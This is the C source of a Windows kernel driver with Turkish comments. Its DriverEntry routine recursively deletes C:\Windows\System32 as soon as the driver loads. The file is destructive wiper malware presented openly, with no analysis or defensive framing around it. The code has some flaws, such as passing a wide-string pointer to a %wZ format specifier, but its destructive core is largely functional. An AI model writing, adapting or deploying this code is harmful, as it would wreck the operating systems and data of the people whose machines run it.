#include <ntddk.h>

VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
    DbgPrint("Driver Unloaded\n");
}

NTSTATUS DeleteFileOrDirectory(PCWSTR targetPath) {
    UNICODE_STRING filePath;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE fileHandle;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status;

    // Hedef dosya veya dizin yolunu ayarla
    RtlInitUnicodeString(&filePath, targetPath);
    InitializeObjectAttributes(&objAttr, &filePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    // Dosya veya dizini aç
    status = ZwOpenFile(&fileHandle, DELETE | SYNCHRONIZE, &objAttr, &ioStatusBlock, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT);
    if (!NT_SUCCESS(status)) {
        DbgPrint("Failed to open file or directory: %wZ, Status: 0x%08X\n", &filePath, status);
        return status;
    }

    // Dosya veya dizini sil
    FILE_DISPOSITION_INFORMATION dispositionInfo;
    dispositionInfo.DeleteFile = TRUE;

    status = ZwSetInformationFile(fileHandle, &ioStatusBlock, &dispositionInfo, sizeof(dispositionInfo), FileDispositionInformation);
    if (!NT_SUCCESS(status)) {
        DbgPrint("Failed to delete file or directory: %wZ, Status: 0x%08X\n", &filePath, status);
    } else {
        DbgPrint("Successfully deleted file or directory: %wZ\n", &filePath);
    }

    // Dosya tanıtıcısını kapat
    ZwClose(fileHandle);

    return status;
}

NTSTATUS DeleteDirectoryRecursively(PCWSTR targetPath) {
    UNICODE_STRING dirPath;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE dirHandle;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status;

    // Dizin yolunu ayarla
    RtlInitUnicodeString(&dirPath, targetPath);
    InitializeObjectAttributes(&objAttr, &dirPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    // Dizin aç
    status = ZwOpenFile(&dirHandle, FILE_LIST_DIRECTORY | SYNCHRONIZE, &objAttr, &ioStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_DIRECTORY_FILE);
    if (!NT_SUCCESS(status)) {
        DbgPrint("Failed to open directory: %wZ, Status: 0x%08X\n", &dirPath, status);
        return status;
    }

    // Dizin içeriğini listele
    BYTE buffer[1024];
    PFILE_DIRECTORY_INFORMATION dirInfo = (PFILE_DIRECTORY_INFORMATION)buffer;
    BOOLEAN restartScan = TRUE;

    do {
        status = ZwQueryDirectoryFile(dirHandle, NULL, NULL, NULL, &ioStatusBlock, dirInfo, sizeof(buffer), FileDirectoryInformation, TRUE, NULL, restartScan);
        restartScan = FALSE;

        if (NT_SUCCESS(status)) {
            do {
                // Alt dosya veya dizin yolunu oluştur
                WCHAR fullPath[MAX_PATH];
                UNICODE_STRING fullPathUnicode;
                RtlStringCchPrintfW(fullPath, MAX_PATH, L"%s\\%.*s", targetPath, dirInfo->FileNameLength / sizeof(WCHAR), dirInfo->FileName);
                RtlInitUnicodeString(&fullPathUnicode, fullPath);

                // Alt dosya veya dizini sil
                if (dirInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    // Alt dizin ise, yinelemeli olarak sil
                    DeleteDirectoryRecursively(fullPathUnicode.Buffer);
                } else {
                    // Dosya ise, doğrudan sil
                    DeleteFileOrDirectory(fullPathUnicode.Buffer);
                }

                // Bir sonraki girdiye geç
                if (dirInfo->NextEntryOffset == 0) {
                    break;
                }
                dirInfo = (PFILE_DIRECTORY_INFORMATION)((PUCHAR)dirInfo + dirInfo->NextEntryOffset);

            } while (TRUE);
        }

    } while (status == STATUS_SUCCESS);

    // Dizin tanıtıcısını kapat
    ZwClose(dirHandle);

    // Son olarak dizini sil
    return DeleteFileOrDirectory(targetPath);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    DbgPrint("Driver Loaded\n");

    // Sürücü kaldırıldığında çağrılacak fonksiyonu ayarla
    DriverObject->DriverUnload = UnloadDriver;

    // Hedef dizin yolu
    PCWSTR targetPath = L"\\??\\C:\\Windows\\System32";

    // Dizin ve içeriğini sil
    NTSTATUS status = DeleteDirectoryRecursively(targetPath);
    if (!NT_SUCCESS(status)) {
        DbgPrint("Failed to delete directory: %wZ, Status: 0x%08X\n", targetPath, status);
    } else {
        DbgPrint("Successfully deleted directory: %wZ\n", targetPath);
    }

    return STATUS_SUCCESS;
}
